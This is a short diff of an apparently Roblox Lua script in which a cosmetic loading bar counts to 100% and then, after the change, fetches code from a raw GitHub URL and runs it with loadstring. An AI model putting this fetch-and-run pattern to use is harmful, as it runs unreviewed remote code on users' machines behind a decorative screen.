@@ -42,10 +42,8 @@ spawn(function()
 		PercentLabel.Text = i .. "%"
 		wait(0.03) -- You can speed it up or slow it down
 	end
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/rzzsupport/rzz/refs/heads/main/use"))()
-
 	ScreenGui:Destroy()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/rzzsupport/rzz/refs/heads/main/use"))()
 end)
 
 
